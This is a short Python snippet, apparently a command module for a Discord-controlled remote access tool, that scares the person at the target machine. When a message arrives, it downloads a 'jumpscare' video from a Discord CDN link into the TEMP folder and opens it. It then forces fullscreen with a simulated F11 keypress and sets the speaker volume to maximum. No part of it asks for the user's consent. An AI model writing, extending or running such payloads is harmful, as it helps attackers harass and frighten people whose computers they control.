import os, requests, time, pyautogui
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
# end of imports

# on message
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))

video_url = "https://cdn.discordapp.com/attachments/1155158384929148941/1155158417611182260/jumpscare.mp4"

temp_folder = os.environ['TEMP']
temp_file = os.path.join(temp_folder, 'jumpscare.mp4')

if not os.path.exists(temp_file):
    response = requests.get(video_url)
    with open(temp_file, 'wb') as file:
        file.write(response.content)

time.sleep(1)
os.startfile(temp_file)
time.sleep(0.5)
pyautogui.press('f11')
volume.SetMasterVolumeLevelScalar(1.0, None)